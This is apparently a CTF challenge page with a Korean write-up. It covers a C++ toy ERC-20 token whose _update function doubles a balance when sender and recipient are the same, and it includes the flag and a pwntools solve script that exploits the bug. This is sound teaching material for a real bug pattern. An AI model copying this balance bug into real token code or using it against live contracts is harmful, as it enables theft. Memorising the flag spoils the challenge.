# hspaceETH

# Usage
- 2024 5월 #2 Space War

# Spec
- 1 Core

# Concept
- Simple ERC-20 implementation in C++, solidity bug

# Description
- Try to hack my ERC-20 based HSpace Token (HST), which worths about 1 wei per token.

# FLAG
- hspace{this_bug_pattern_really_existed_in_several_ethereum_tokens}

# WriteUp
# 풀이

해당 프로그램은 [ERC-20 protocol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)을 간단하게 C++ 상에서 구현한 구현체이다.

Real-world에서 발생한 Ethereum Token 취약점을 모티브로 출제하였다.

```cpp
class ERC20 {
public:
    ERC20();
    ERC20(address user);
    uint32_t balanceOf(address account);
    void approve(address spender, uint32_t amount);
    uint32_t allowance(address owner, address spender);
    void transfer(address to, uint32_t amount);
    void transferFrom(address sender, address recipient, uint32_t amount);
    void check(address account);

private:
    map<address, uint32_t> _balance;
    map<address, map<address, uint32_t>> _allowance;
    uint32_t _totalSupply;

    void _spendAllowance(address owner, address spender, uint32_t value);
    void _mint(address account, uint32_t value);
    void _update(address from, address to, uint32_t value);
};
```

ERC-20에 구현되어 있는 대부분의 method와 field가 구현되어있으며, 유저는 public method들을 json interface를 통해 호출할 수 있다.

실제 ERC-20과는 달리 SafeMath 라이브러리 및 Solidity 0.8.0 이상 버전에 내장된 Integer Overflow 방지가 적용되어있지 않지만, Integer Overflow를 트리거 할 수 없어 무관하다.

또한 Ethereum에서 private key를 통해 Wallet address를 생성할 때 거치는 ECDSA와 Keccak-256 해싱은 단순 sha256으로 대체하였다.

프로그램이 실행되면 user는 16개의 토큰을 가지며, 같은 network상 무작위의 지갑 주소들에 token을 minting한다.

특정 주소가 10,000,000개 이상의 토큰을 보유할 시 flag를 출력해준다.

취약점은 `_update` 함수에 존재한다.

```c++
void ERC20::_update(address from, address to, uint32_t value) {
    uint32_t from_balance = this->_balance[from];
    uint32_t to_balance = this->_balance[to];
    this->_balance[from] = from_balance - value;
    this->_balance[to] += to_balance + value;
}
```

언뜻 보면 안전해보이나, from과 to가 같은 address로 전달된다면 아래와 같은 상황이 벌어진다 (!)

```
- wallet A == from == to
- balanceOf(A) == 16

uint32_t from_balance = this->_balance[from]; // 16
uint32_t to_balance = this->_balance[to]; // 16
this->_balance[from] = from_balance - value; // _balance[A] = 16 - 16
this->_balance[to] += to_balance + value; // _balance[A] = 16 + 16
```

따라서 transferFrom(USER, USER, balanceOf(USER))가 실행될 때 마다 balance는 2배로 증가하고, 이를 이용해 플래그를 획득할 수 있다.

```
from pwn import *

p = process('./hspaceETH')

p.recvuntil(b': ')
p.sendline(b'1234')

balance = 16

while balance < 10000000:
    p.recvuntil(b'Tx : ')
    pay = b'{"method" : "transferFrom", "sender" : %d, "recipient" : %d, "amount": %d}' % (0xf104, 0xf104, balance)
    p.sendline(pay)
    balance *= 2

p.recvuntil(b'Tx : ')
pay = b'{"method" : "balanceOf", "account" : %d}' % (0xf104)
p.sendline(pay)

p.recvuntil(b'Tx : ')
pay = b'{"method" : "check", "account" : %d}' % (0xf104)
p.sendline(pay)

p.interactive()
```